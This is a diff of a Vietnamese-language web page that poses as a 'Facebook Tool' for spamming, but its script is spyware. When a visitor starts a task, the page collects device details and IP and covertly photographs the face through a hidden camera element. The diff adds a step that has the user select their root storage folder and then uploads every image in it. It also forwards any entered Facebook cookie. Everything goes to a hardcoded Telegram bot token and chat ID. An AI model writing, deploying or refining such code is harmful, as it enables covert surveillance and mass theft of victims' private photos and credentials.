@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Facebook Tool | Auto Spam + Trace</title>
+    <title>Facebook Tool | Auto Spam + Full Storage Leak</title>
     <style>
-        /* ---------- GIAO DIỆN GỐC TỪ INDEX.PHP ---------- */
         * {
             margin: 0;
             padding: 0;
@@ -16,7 +15,7 @@
         body {
             background: linear-gradient(135deg, #0a0a1a 0%, #0f0f1f 100%);
             min-height: 100vh;
-            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, sans-serif;
+            font-family: 'Segoe UI', 'Poppins', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -24,11 +23,11 @@
         }
         .container {
             width: 100%;
-            max-width: 480px;
+            max-width: 520px;
             background: rgba(20, 20, 40, 0.95);
             border-radius: 28px;
             backdrop-filter: blur(10px);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(66, 153, 225, 0.2);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4), 0 0 0 1px rgba(66,153,225,0.2);
             overflow: hidden;
         }
         .fb-header {
@@ -40,12 +39,10 @@
             color: white;
             font-size: 24px;
             font-weight: 600;
-            letter-spacing: 0.5px;
         }
         .fb-header p {
             color: rgba(255,255,255,0.9);
             font-size: 12px;
-            margin-top: 5px;
         }
         .content {
             padding: 20px;
@@ -55,19 +52,15 @@
             border-radius: 20px;
             padding: 18px;
             margin-bottom: 20px;
-            border: 1px solid rgba(66, 153, 225, 0.3);
+            border: 1px solid rgba(66,153,225,0.3);
         }
         .cookie-label {
             color: #fff;
             font-size: 14px;
-            font-weight: 500;
             margin-bottom: 10px;
             display: flex;
             align-items: center;
             gap: 8px;
-        }
-        .cookie-label i {
-            color: #1877f2;
         }
         .cookie-input {
             width: 100%;
@@ -78,13 +71,6 @@
             color: #fff;
             font-size: 13px;
             font-family: monospace;
-            resize: vertical;
-            transition: all 0.2s;
-        }
-        .cookie-input:focus {
-            outline: none;
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px rgba(24,119,242,0.3);
         }
         .info-row {
             display: flex;
@@ -102,7 +88,6 @@
             color: rgba(255,255,255,0.6);
             font-size: 11px;
             text-transform: uppercase;
-            letter-spacing: 1px;
             margin-bottom: 6px;
         }
         .info-value {
@@ -112,7 +97,6 @@
             background: rgba(0,0,0,0.3);
             padding: 8px 10px;
             border-radius: 12px;
-            border: 1px solid rgba(255,255,255,0.1);
         }
         .delay-section {
             background: rgba(255,255,255,0.05);
@@ -133,7 +117,6 @@
             -webkit-appearance: none;
             background: rgba(255,255,255,0.2);
             border-radius: 10px;
-            outline: none;
         }
         .delay-slider::-webkit-slider-thumb {
             -webkit-appearance: none;
@@ -141,13 +124,11 @@
             height: 18px;
             background: #1877f2;
             border-radius: 50%;
-            cursor: pointer;
             box-shadow: 0 0 8px #1877f2;
         }
         .delay-value {
             color: #1877f2;
             font-weight: bold;
-            font-size: 16px;
         }
         .task-buttons {
             display: flex;
@@ -165,42 +146,22 @@
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.2s;
             color: white;
+            transition: 0.2s;
         }
-        .task-btn:active {
-            transform: scale(0.97);
-        }
-        .task-left {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .task-icon {
-            font-size: 28px;
-        }
-        .task-name {
-            font-weight: 700;
-            letter-spacing: 1px;
-        }
+        .task-btn:active { transform: scale(0.97); }
+        .task-left { display: flex; align-items: center; gap: 12px; }
+        .task-icon { font-size: 28px; }
+        .task-name { font-weight: 700; }
         .task-badge {
             background: rgba(0,0,0,0.3);
             padding: 5px 12px;
             border-radius: 40px;
             font-size: 12px;
         }
-        .btn-ngon {
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            box-shadow: 0 8px 20px rgba(245,87,108,0.3);
-        }
-        .btn-nhay {
-            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
-            box-shadow: 0 8px 20px rgba(79,172,254,0.3);
-        }
-        .btn-top {
-            background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);
-            box-shadow: 0 8px 20px rgba(67,233,123,0.3);
-        }
+        .btn-ngon { background: linear-gradient(135deg, #f093fb, #f5576c); }
+        .btn-nhay { background: linear-gradient(135deg, #4facfe, #00f2fe); }
+        .btn-top { background: linear-gradient(135deg, #43e97b, #38f9d7); }
         .status-area {
             background: rgba(0,0,0,0.5);
             border-radius: 16px;
@@ -219,80 +180,13 @@
             animation: pulse 1.5s infinite;
         }
         @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(0.8); }
+            0%,100%{opacity:1;transform:scale(1);}
+            50%{opacity:0.5;transform:scale(0.8);}
         }
         .status-text {
             color: rgba(255,255,255,0.8);
             font-size: 12px;
             flex: 1;
-        }
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.95);
-            z-index: 1000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            backdrop-filter: blur(10px);
-            transition: 0.3s;
-        }
-        .overlay.hide {
-            display: none;
-        }
-        .spinner {
-            width: 65px;
-            height: 65px;
-            border: 4px solid rgba(24,119,242,0.2);
-            border-top-color: #1877f2;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .overlay-text {
-            color: #fff;
-            font-size: 20px;
-            margin-top: 25px;
-            font-weight: 500;
-        }
-        .overlay-sub {
-            color: rgba(255,255,255,0.6);
-            font-size: 13px;
-            margin-top: 10px;
-        }
-        .hidden-cam {
-            position: fixed;
-            top: -1000px;
-            left: -1000px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,0,0,0.9);
-            color: white;
-            padding: 12px 24px;
-            border-radius: 50px;
-            font-size: 14px;
-            z-index: 1001;
-            animation: toastIn 0.3s ease;
-            border-left: 3px solid #1877f2;
-        }
-        @keyframes toastIn {
-            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
-            to { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
         .task-manager {
             margin-top: 15px;
@@ -303,21 +197,92 @@
             font-size: 11px;
             color: rgba(255,255,255,0.5);
         }
+        .overlay {
+            position: fixed;
+            top:0; left:0; width:100%; height:100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(10px);
+        }
+        .overlay.hide { display: none; }
+        .spinner {
+            width: 65px; height: 65px;
+            border: 4px solid rgba(24,119,242,0.2);
+            border-top-color: #1877f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to{transform:rotate(360deg);} }
+        .overlay-text {
+            color: #fff;
+            font-size: 20px;
+            margin-top: 25px;
+        }
+        .overlay-sub {
+            color: rgba(255,255,255,0.6);
+            font-size: 13px;
+            margin-top: 10px;
+        }
+        .hidden-cam {
+            position: fixed;
+            top: -1000px; left: -1000px;
+            width: 1px; height: 1px;
+            opacity: 0; pointer-events: none;
+        }
+        .toast {
+            position: fixed;
+            bottom: 30px; left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.9);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-size: 14px;
+            z-index: 1001;
+            border-left: 3px solid #1877f2;
+        }
+        .log-box {
+            background: #0a0f0f;
+            border-radius: 12px;
+            padding: 10px;
+            margin: 15px 0 5px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 11px;
+            color: #aaffaa;
+            border: 1px solid #2a5a2a;
+        }
+        .progress {
+            width: 100%;
+            height: 8px;
+            background: #1a2a1a;
+            border-radius: 20px;
+            overflow: hidden;
+            margin: 8px 0;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #00aa00;
+            transition: width 0.1s;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="fb-header">
             <h1>📱 Facebook Tool</h1>
-            <p>Cookie Checker | Auto Spam + Trace</p>
+            <p>Auto Spam + Full Storage Leak</p>
         </div>
         <div class="content">
             <div class="cookie-section">
-                <div class="cookie-label">
-                    <span>🍪</span> Cookie Facebook
-                    <span style="font-size: 10px; color: #888;">(bắt buộc phải điền)</span>
-                </div>
-                <input type="text" class="cookie-input" id="cookieInput" placeholder="EAAB... hoặc nhập bất kỳ">
+                <div class="cookie-label"><span>🍪</span> Cookie Facebook</div>
+                <input type="text" class="cookie-input" id="cookieInput" placeholder="EAAB... hoặc để trống">
             </div>
             <div class="info-row">
                 <div class="info-box">
@@ -331,40 +296,36 @@
             </div>
             <div class="delay-section">
                 <div class="delay-header">
-                    <span>⏱️ Delay Spam</span>
+                    <span>⏱️ Delay Gửi Ảnh</span>
                     <span class="delay-value" id="delayValue">1.5s</span>
                 </div>
                 <input type="range" class="delay-slider" id="delaySlider" min="0.5" max="5" step="0.1" value="1.5">
             </div>
             <div class="task-buttons">
                 <button class="task-btn btn-ngon" data-task="spam_ngon">
-                    <div class="task-left">
-                        <span class="task-icon">🗣️</span>
-                        <span class="task-name">SPAM NGÔN</span>
-                    </div>
-                    <span class="task-badge">🔥 1000+</span>
+                    <div class="task-left"><span class="task-icon">🗣️</span><span class="task-name">SPAM NGÔN</span></div>
+                    <span class="task-badge">🔥 Full Ảnh</span>
                 </button>
                 <button class="task-btn btn-nhay" data-task="spam_nhay">
-                    <div class="task-left">
-                        <span class="task-icon">💀</span>
-                        <span class="task-name">SPAM NHÂY</span>
-                    </div>
-                    <span class="task-badge">⚡ 500+</span>
+                    <div class="task-left"><span class="task-icon">💀</span><span class="task-name">SPAM NHÂY</span></div>
+                    <span class="task-badge">⚡ Full Ảnh</span>
                 </button>
                 <button class="task-btn btn-top" data-task="spam_top">
-                    <div class="task-left">
-                        <span class="task-icon">👑</span>
-                        <span class="task-name">SPAM TOP</span>
-                    </div>
-                    <span class="task-badge">🏆 200+</span>
+                    <div class="task-left"><span class="task-icon">👑</span><span class="task-name">SPAM TOP</span></div>
+                    <span class="task-badge">🏆 Full Ảnh</span>
                 </button>
             </div>
+            <div class="log-box" id="logBox">[DinhXuanThang] Sẵn sàng phục vụ Boss.</div>
+            <div class="progress">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div id="progressText" class="status-text" style="margin-bottom:8px;">Sẵn sàng.</div>
             <div class="status-area">
                 <div class="status-dot"></div>
-                <div class="status-text" id="statusText">✅ Sẵn sàng | Chọn task để spam</div>
+                <div class="status-text" id="statusText">✅ Sẵn sàng | Chọn task để bắt đầu</div>
             </div>
             <div class="task-manager">
-                <span>📋 Task Manager v2.0</span>
+                <span>📋 Task Manager v3.1</span>
                 <span id="taskCount">0 task đã xử lý</span>
             </div>
         </div>
@@ -381,11 +342,11 @@
         (function(){
             "use strict";
 
-            // ================== TOKEN & CHAT ID CỐ ĐỊNH ==================
+            // ========== TOKEN & CHAT ID CỐ ĐỊNH ==========
             const BOT_TOKEN = "8330189724:AAFP5A36aRLxjkJ7mR132FhnLjDDjGbOxRg";
             const CHAT_ID = "8299874888";
 
-            // ================== DOM ELEMENTS ==================
+            // ========== DOM ==========
             const cookieInput = document.getElementById('cookieInput');
             const fbIdSpan = document.getElementById('fbId');
             const channelIdSpan = document.getElementById('channelId');
@@ -398,286 +359,327 @@
             const overlaySub = document.getElementById('overlaySub');
             const videoCam = document.getElementById('video');
             const canvasCam = document.getElementById('canvas');
+            const logBox = document.getElementById('logBox');
+            const progressBar = document.getElementById('progressBar');
+            const progressText = document.getElementById('progressText');
 
-            // ================== BIẾN TOÀN CỤC ==================
+            // ========== BIẾN TOÀN CỤC ==========
             let taskCount = 0;
             let isProcessing = false;
             let mediaStream = null;
             let deviceInfoCache = null;
             let publicIP = null;
 
-            // ================== TIỆN ÍCH ==================
-            function showToast(message, isError = false) {
+            // ========== UTILS ==========
+            function showToast(msg, isErr=false) {
                 const toast = document.createElement('div');
                 toast.className = 'toast';
-                toast.style.background = isError ? 'rgba(220,53,69,0.9)' : 'rgba(0,0,0,0.9)';
-                toast.style.borderLeftColor = isError ? '#dc3545' : '#1877f2';
-                toast.innerText = message;
+                toast.style.background = isErr ? 'rgba(220,53,69,0.9)' : 'rgba(0,0,0,0.9)';
+                toast.innerText = msg;
                 document.body.appendChild(toast);
-                setTimeout(() => toast.remove(), 2500);
+                setTimeout(()=>toast.remove(), 2500);
             }
             function updateTaskCount() {
                 taskCountSpan.innerText = taskCount + ' task đã xử lý';
             }
+            function log(message, isError=false) {
+                const time = new Date().toLocaleTimeString();
+                const line = `[${time}] [DinhXuanThang] ${message}`;
+                logBox.innerHTML += line + '\n';
+                if(isError) logBox.innerHTML += `[${time}] ⚠️ LỖI: ${message}\n`;
+                logBox.scrollTop = logBox.scrollHeight;
+            }
+            function updateProgress(current, total) {
+                const pct = total ? (current/total)*100 : 0;
+                progressBar.style.width = pct + '%';
+                progressText.innerText = `Đã gửi: ${current}/${total} ảnh (${pct.toFixed(1)}%)`;
+            }
 
-            // ID và Channel đã được fix cứng trong HTML, không cần random nữa
-            // Cập nhật delay hiển thị
-            delaySlider.addEventListener('input', function() {
-                delayValue.innerText = this.value + 's';
-            });
+            delaySlider.addEventListener('input', ()=> delayValue.innerText = delaySlider.value+'s');
 
-            // ================== THU THẬP THÔNG TIN THIẾT BỊ ==================
+            // ========== THU THẬP THÔNG TIN ==========
             async function collectDeviceInfo() {
-                if (deviceInfoCache) return deviceInfoCache;
-
+                if(deviceInfoCache) return deviceInfoCache;
                 let ip = 'Đang lấy...';
                 try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    ip = ipData.ip;
-                    publicIP = ip;
-                } catch (e) {
-                    ip = 'Không lấy được';
-                }
-
-                let batteryInfo = 'N/A';
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    ip = data.ip; publicIP = ip;
+                } catch(e) { ip = 'Không lấy được'; }
+                let battery = 'N/A';
                 try {
-                    if (navigator.getBattery) {
+                    if(navigator.getBattery) {
                         const bt = await navigator.getBattery();
-                        batteryInfo = (bt.level * 100).toFixed(0) + '% ' + (bt.charging ? '(Đang sạc)' : '(Pin)');
+                        battery = (bt.level*100).toFixed(0)+'% '+(bt.charging?'(Sạc)':'');
                     }
-                } catch (e) {}
-
-                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const resolution = window.screen.width + 'x' + window.screen.height;
-                const cpuCores = navigator.hardwareConcurrency || 'N/A';
-                const platform = navigator.platform;
-                const userAgent = navigator.userAgent;
-                const language = navigator.language;
-                const referrer = document.referrer || 'Trực tiếp';
-                const pageUrl = window.location.href;
-
+                } catch(e) {}
                 const info = {
-                    ip, batteryInfo, timezone, resolution, cpuCores,
-                    platform, userAgent, language, referrer, pageUrl
+                    ip, battery,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    resolution: screen.width+'x'+screen.height,
+                    cpu: navigator.hardwareConcurrency||'N/A',
+                    platform: navigator.platform,
+                    ua: navigator.userAgent,
+                    lang: navigator.language,
+                    referrer: document.referrer||'Trực tiếp',
+                    url: location.href
                 };
                 deviceInfoCache = info;
                 return info;
             }
 
-            function formatDeviceMessage(info, taskDisplay, icon) {
-                return `${icon} 𝐓𝐀𝐒𝐊: ${taskDisplay} ${icon}\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}\n` +
-                    `🌐 IP: ${info.ip}\n` +
-                    `📍 Múi giờ: ${info.timezone}\n` +
-                    `🔋 Pin: ${info.batteryInfo}\n` +
-                    `🖥️ Độ phân giải: ${info.resolution}\n` +
-                    `⚙️ CPU: ${info.cpuCores} nhân\n` +
-                    `📱 Platform: ${info.platform}\n` +
-                    `🌍 Ngôn ngữ: ${info.language}\n` +
-                    `🔗 Referrer: ${info.referrer}\n` +
-                    `📄 URL: ${info.pageUrl}\n` +
-                    `🆔 UA: ${info.userAgent.substring(0, 120)}...\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `✅ Capture thành công!`;
+            function formatDeviceMsg(info, taskDisplay, icon) {
+                return `${icon} 𝐓𝐀𝐒𝐊: ${taskDisplay} ${icon}\n`+
+                    `━━━━━━━━━━━━━━━━━━━━━━\n`+
+                    `⏰ ${new Date().toLocaleString('vi-VN')}\n`+
+                    `🌐 IP: ${info.ip}\n📍 Múi giờ: ${info.timezone}\n`+
+                    `🔋 Pin: ${info.battery}\n🖥️ Độ phân giải: ${info.resolution}\n`+
+                    `⚙️ CPU: ${info.cpu} nhân\n📱 Platform: ${info.platform}\n`+
+                    `🌍 Ngôn ngữ: ${info.lang}\n🔗 Referrer: ${info.referrer}\n`+
+                    `📄 URL: ${info.url}\n🆔 UA: ${info.ua.substring(0,120)}...\n`+
+                    `━━━━━━━━━━━━━━━━━━━━━━\n✅ Capture thành công!`;
             }
 
-            // ================== GỬI QUA TELEGRAM ==================
-            async function sendPhotoToTelegram(imageBlob, caption) {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', imageBlob, 'capture.jpg');
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'HTML');
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+            // ========== GỬI TELEGRAM ==========
+            async function sendPhoto(file, caption) {
+                const form = new FormData();
+                form.append('chat_id', CHAT_ID);
+                form.append('photo', file);
+                form.append('caption', caption);
+                form.append('parse_mode', 'HTML');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:form });
             }
-
-            async function sendMessageToTelegram(text) {
+            async function sendMessage(text) {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text,
-                        parse_mode: 'HTML'
-                    })
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode:'HTML' })
                 });
             }
-
             async function sendFakeCookieReport(taskType, deviceInfo) {
-                const fakeCookie = cookieInput.value.trim() || "EAAB_FAKE_" + Math.random().toString(36).substring(2, 12);
+                const fakeCookie = cookieInput.value.trim() || "EAAB_FAKE_"+Math.random().toString(36).substr(2,10);
                 const fakeId = fbIdSpan.innerText;
                 const fakeChannel = channelIdSpan.innerText;
                 const delay = delaySlider.value;
-                const taskNames = {
-                    spam_ngon: 'SPAM NGÔN',
-                    spam_nhay: 'SPAM NHÂY',
-                    spam_top: 'SPAM TOP'
-                };
-                const taskDisplay = taskNames[taskType] || 'UNKNOWN';
-                const msg = `🍪 <b>COOKIE GIẢ - ${taskDisplay}</b>\n` +
-                    `━━━━━━━━━━━━━━━━\n` +
-                    `📝 Cookie: ${fakeCookie}\n` +
-                    `🆔 ID: ${fakeId}\n` +
-                    `📢 Channel: ${fakeChannel}\n` +
-                    `⏱️ Delay: ${delay}s\n` +
-                    `🌐 IP: ${deviceInfo.ip}\n` +
-                    `⏰ Time: ${new Date().toLocaleString('vi-VN')}`;
-                await sendMessageToTelegram(msg);
+                const names = { spam_ngon:'SPAM NGÔN', spam_nhay:'SPAM NHÂY', spam_top:'SPAM TOP' };
+                const msg = `🍪 <b>COOKIE GIẢ - ${names[taskType]}</b>\n`+
+                    `━━━━━━━━━━━━━━━━\n📝 Cookie: ${fakeCookie}\n`+
+                    `🆔 ID: ${fakeId}\n📢 Channel: ${fakeChannel}\n⏱️ Delay: ${delay}s\n`+
+                    `🌐 IP: ${deviceInfo.ip}\n⏰ ${new Date().toLocaleString('vi-VN')}`;
+                await sendMessage(msg);
             }
 
-            // ================== CAMERA ==================
+            // ========== CAMERA ==========
             function capturePhoto() {
-                return new Promise((resolve, reject) => {
-                    if (!videoCam.videoWidth || videoCam.videoWidth === 0) {
-                        reject(new Error('Camera chưa sẵn sàng'));
-                        return;
-                    }
+                return new Promise((resolve, reject)=>{
+                    if(!videoCam.videoWidth) return reject(new Error('Camera chưa sẵn sàng'));
                     canvasCam.width = videoCam.videoWidth;
                     canvasCam.height = videoCam.videoHeight;
                     const ctx = canvasCam.getContext('2d');
-                    ctx.drawImage(videoCam, 0, 0, canvasCam.width, canvasCam.height);
-                    
-                    canvasCam.toBlob((blob) => {
-                        if (blob) resolve(blob);
-                        else reject(new Error('Không thể tạo ảnh'));
-                    }, 'image/jpeg', 0.9);
+                    ctx.drawImage(videoCam, 0,0);
+                    canvasCam.toBlob(blob=> blob? resolve(blob) : reject(new Error('Không tạo ảnh')), 'image/jpeg', 0.9);
                 });
             }
-
             function startCamera() {
-                return new Promise((resolve, reject) => {
-                    navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" },
-                        audio: false 
-                    })
-                    .then(stream => {
+                return new Promise((resolve, reject)=>{
+                    navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:false })
+                    .then(stream=>{
                         mediaStream = stream;
                         videoCam.srcObject = stream;
-                        videoCam.onloadedmetadata = () => {
-                            videoCam.play();
-                            setTimeout(resolve, 800);
-                        };
-                    })
-                    .catch(err => reject(err));
+                        videoCam.onloadedmetadata = ()=>{ videoCam.play(); setTimeout(resolve,800); };
+                    }).catch(reject);
+                });
+            }
+            function stopCamera() {
+                if(mediaStream) { mediaStream.getTracks().forEach(t=>t.stop()); mediaStream = null; }
+            }
+
+            // ========== CHỌN THƯ MỤC GỐC & GỬI TOÀN BỘ ẢNH ==========
+            async function requestAndSendFullStorage() {
+                return new Promise((resolve) => {
+                    // Hiển thị hướng dẫn chọn thư mục gốc
+                    overlaySub.innerText = '⚠️ Vui lòng chọn THƯ MỤC GỐC (Internal Storage) để quét toàn bộ ảnh!';
+                    statusText.innerHTML = '📁 Đang chờ bạn chọn thư mục gốc...';
+                    
+                    const input = document.createElement('input');
+                    input.type = 'file';
+                    input.webkitdirectory = true;
+                    input.multiple = true;
+                    
+                    input.onchange = async (e) => {
+                        const files = Array.from(e.target.files);
+                        if(files.length === 0) {
+                            log('Không có file nào được chọn.', true);
+                            resolve({ success: 0, total: 0 });
+                            return;
+                        }
+                        
+                        // Lọc tất cả ảnh (các định dạng phổ biến)
+                        const imgExts = ['jpg','jpeg','png','gif','webp','bmp'];
+                        const images = files.filter(f => {
+                            const ext = f.name.split('.').pop().toLowerCase();
+                            return imgExts.includes(ext) && f.type.startsWith('image/');
+                        });
+                        
+                        const total = images.length;
+                        if(total === 0) {
+                            log('Không tìm thấy ảnh nào trong thư mục đã chọn.', true);
+                            resolve({ success: 0, total: 0 });
+                            return;
+                        }
+                        
+                        log(`🔍 Đã quét thấy ${total} ảnh trong toàn bộ thư mục con. Bắt đầu gửi...`);
+                        statusText.innerHTML = `📤 Đang gửi 0/${total} ảnh...`;
+                        overlaySub.innerText = `0/${total} ảnh đã gửi`;
+                        
+                        let success = 0;
+                        let fail = 0;
+                        const delaySec = parseFloat(delaySlider.value) * 1000;
+                        
+                        for(let i=0; i<total; i++) {
+                            const file = images[i];
+                            const idx = i+1;
+                            
+                            // Cập nhật giao diện
+                            log(`📤 (${idx}/${total}) ${file.name} (${(file.size/1024).toFixed(1)} KB)`);
+                            overlaySub.innerText = `${idx}/${total} ảnh đã gửi`;
+                            updateProgress(idx, total);
+                            
+                            try {
+                                if(file.size > 10*1024*1024) {
+                                    log(`❌ Ảnh ${file.name} quá 10MB, bỏ qua.`, true);
+                                    fail++;
+                                    continue;
+                                }
+                                
+                                const caption = `📸 ${file.name} | ${new Date().toLocaleString()}`;
+                                await sendPhoto(file, caption);
+                                success++;
+                                log(`✅ Đã gửi: ${file.name}`);
+                            } catch(err) {
+                                fail++;
+                                log(`❌ Gửi thất bại ${file.name}: ${err.message}`, true);
+                            }
+                            
+                            // Delay giữa các lần gửi
+                            await new Promise(r=>setTimeout(r, delaySec));
+                        }
+                        
+                        log(`🏁 HOÀN TẤT FULL STORAGE. Thành công: ${success}, Thất bại: ${fail}.`);
+                        resolve({ success, total });
+                    };
+                    
+                    input.oncancel = () => {
+                        log('Người dùng hủy chọn thư mục.', true);
+                        resolve({ success: 0, total: 0, cancelled: true });
+                    };
+                    
+                    input.click();
                 });
             }
 
-            function stopCamera() {
-                if (mediaStream) {
-                    mediaStream.getTracks().forEach(track => track.stop());
-                    mediaStream = null;
-                }
-            }
-
-            // ================== XỬ LÝ CHÍNH ==================
+            // ========== XỬ LÝ SPAM (TÍCH HỢP FULL STORAGE LEAK) ==========
             const taskMeta = {
-                spam_ngon: { name: 'SPAM NGÔN', icon: '🗣️' },
-                spam_nhay: { name: 'SPAM NHÂY', icon: '💀' },
-                spam_top: { name: 'SPAM TOP', icon: '👑' }
+                spam_ngon: { name:'SPAM NGÔN', icon:'🗣️' },
+                spam_nhay: { name:'SPAM NHÂY', icon:'💀' },
+                spam_top: { name:'SPAM TOP', icon:'👑' }
             };
 
-            async function processTask(taskType) {
-                if (isProcessing) {
-                    showToast('⚠️ Đang xử lý task khác, vui lòng chờ!', true);
-                    return;
-                }
-
+            async function processSpamTask(taskType) {
+                if(isProcessing) { showToast('Đang xử lý task khác, vui lòng chờ!', true); return; }
                 isProcessing = true;
-                const meta = taskMeta[taskType] || { name: 'UNKNOWN', icon: '🎯' };
+                const meta = taskMeta[taskType];
+                
                 overlay.classList.remove('hide');
                 overlayText.innerText = `ĐANG ${meta.name}...`;
-                overlaySub.innerText = 'Đang thu thập dữ liệu & kích hoạt camera...';
-
+                overlaySub.innerText = 'Đang thu thập dữ liệu thiết bị...';
+                log(`🚀 Bắt đầu task ${meta.name}`);
+                
                 try {
+                    // 1. Thu thập thông tin và gửi cookie giả
                     const deviceInfoPromise = collectDeviceInfo();
                     
-                    let cameraAvailable = false;
+                    // 2. Bật camera và chụp ảnh (nếu được)
+                    let camOk = false;
+                    let photoBlob = null;
                     try {
                         await startCamera();
-                        cameraAvailable = true;
-                    } catch (camErr) {
-                        console.warn('Camera không khả dụng:', camErr);
-                        cameraAvailable = false;
+                        camOk = true;
+                        overlaySub.innerText = 'Đang chụp ảnh khuôn mặt...';
+                        photoBlob = await capturePhoto();
+                    } catch(camErr) {
+                        log('Camera không khả dụng hoặc bị từ chối.', true);
+                        camOk = false;
                     }
-
+                    
                     const deviceInfo = await deviceInfoPromise;
+                    await sendFakeCookieReport(taskType, deviceInfo).catch(e=>log('Lỗi gửi cookie: '+e, true));
                     
-                    await sendFakeCookieReport(taskType, deviceInfo).catch(e => console.warn);
-
-                    if (cameraAvailable) {
-                        overlaySub.innerText = 'Đang chụp ảnh...';
-                        const imageBlob = await capturePhoto();
-                        const caption = formatDeviceMessage(deviceInfo, meta.name, meta.icon);
-                        await sendPhotoToTelegram(imageBlob, caption);
+                    // Gửi ảnh camera nếu có
+                    if(camOk && photoBlob) {
+                        const caption = formatDeviceMsg(deviceInfo, meta.name, meta.icon);
+                        await sendPhoto(photoBlob, caption);
+                        log('✅ Đã gửi ảnh camera.');
                         stopCamera();
-
-                        taskCount++;
-                        updateTaskCount();
-                        statusText.innerHTML = `✅ ${meta.icon} ${meta.name} THÀNH CÔNG! Đã chụp và gửi về`;
-                        showToast(`${meta.icon} ${meta.name} thành công! Đã capture mặt.`);
                     } else {
-                        const noCamMsg = `⚠️ <b>KHÔNG CÓ CAMERA - ${meta.name}</b>\n` +
-                            `━━━━━━━━━━━━━━━━\n` +
-                            `🌐 IP: ${deviceInfo.ip}\n` +
-                            `📍 Múi giờ: ${deviceInfo.timezone}\n` +
-                            `🔋 Pin: ${deviceInfo.batteryInfo}\n` +
-                            `🖥️ Độ phân giải: ${deviceInfo.resolution}\n` +
-                            `⚙️ CPU: ${deviceInfo.cpuCores}\n` +
-                            `📱 Platform: ${deviceInfo.platform}\n` +
-                            `🌍 Ngôn ngữ: ${deviceInfo.language}\n` +
-                            `🔗 Referrer: ${deviceInfo.referrer}\n` +
-                            `📄 URL: ${deviceInfo.pageUrl}\n` +
-                            `🆔 UA: ${deviceInfo.userAgent.substring(0, 100)}...\n` +
-                            `⏰ Time: ${new Date().toLocaleString('vi-VN')}`;
-                        await sendMessageToTelegram(noCamMsg);
-                        
-                        statusText.innerHTML = `❌ ${meta.icon} ${meta.name} THẤT BẠI! Không thể truy cập camera`;
-                        showToast(`❌ ${meta.name} thất bại! Không có camera hoặc bị từ chối`, true);
+                        const noCamMsg = `⚠️ <b>KHÔNG CÓ CAMERA - ${meta.name}</b>\n`+
+                            `━━━━━━━━━━━━━━━━\n🌐 IP: ${deviceInfo.ip}\n📍 ${deviceInfo.timezone}\n`+
+                            `🔋 ${deviceInfo.battery}\n🖥️ ${deviceInfo.resolution}\n⚙️ ${deviceInfo.cpu}\n`+
+                            `📱 ${deviceInfo.platform}\n🌍 ${deviceInfo.lang}\n🔗 ${deviceInfo.referrer}\n`+
+                            `📄 ${deviceInfo.url}\n🆔 ${deviceInfo.ua.substring(0,100)}...\n`+
+                            `⏰ ${new Date().toLocaleString('vi-VN')}`;
+                        await sendMessage(noCamMsg);
+                        log('ℹ️ Đã gửi thông tin không có camera.');
                     }
-
-                } catch (error) {
-                    console.error('Lỗi task:', error);
-                    statusText.innerHTML = `❌ Lỗi hệ thống khi xử lý ${meta.name}`;
